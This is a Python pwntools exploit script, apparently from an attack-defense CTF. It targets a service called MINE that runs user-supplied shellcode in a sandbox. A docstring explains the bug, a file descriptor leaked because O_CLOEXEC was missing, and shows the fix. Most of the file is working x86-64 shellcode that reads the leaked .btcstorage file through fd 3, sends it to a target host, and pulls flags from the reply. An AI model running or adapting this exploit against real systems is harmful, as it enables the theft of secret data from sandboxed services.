import re
import sys
import os
try:
	from .connector import BackdoorConnector
except ImportError:
	from connector import BackdoorConnector
os.environ['PWNLIB_NOTERM'] = '1'

from pwn import *
context.arch = 'amd64'



"""
MINE executes user-provided shellcode in a sandbox (called "the mine").
While chroot etc is properly applied, the file containing the bitcoin addresses is not closed before fork/exec.
And because it's not opened with O_CLOEXEC, it is still open in mine, as file descriptor 3. 
We read this file's content and print it to stdout (which we receive as an answer).

btcstorage.c:
int fd = open(".btcstorage", O_RDWR | O_CREAT, 0600);
Proper code would be:
int fd = open(".btcstorage", O_RDWR | O_CREAT | O_CLOEXEC, 0600);
"""



def exploit(target):
    assembly = '''
# define SEEK_SET	0	/* Seek from beginning of file.  */
# define SEEK_CUR	1	/* Seek from current position.  */
# define SEEK_END	2	/* Seek from end of file.  */

    // r12 = lseek(3, 0, SEEK_CUR)
    mov rax, 8
    mov rdi, 3
    mov rsi, 0
    mov rdx, SEEK_CUR
    syscall
    mov r12, rax
    mov r13, rax
    
    cmp r12, 1024
    jl ok
    mov r12, 1024
    
ok:
    // lseek(3, -pos, SEEK_CUR)
    mov rax, 8
    mov rdi, 3
    mov rsi, 0
    sub rsi, r12
    mov rdx, SEEK_CUR
    syscall
   
    sub rsp, 1024
    // read(1, rsp, 1024)
    mov rax, 0
    mov rdi, 3
    mov rsi, rsp
    mov rdx, 1024
    syscall
    // write(1, rsp, 1024)
    mov rax, 1
    mov rdi, 1
    mov rsi, rsp
    mov rdx, 1024
    syscall
    '''
    assembly = cpp(assembly)
    binary = asm(assembly)
    with BackdoorConnector(target, True) as connector:
        response = connector.check_command(b'MINE\x00' + binary, timeout=3)
        print(response)
        for flag in re.findall(r'SAAR{[A-Za-z0-9_\-]+}', response.decode(errors='ignore')):
            print('-', flag)


if __name__ == '__main__':
    exploit('127.0.0.1' if len(sys.argv) < 2 else sys.argv[1])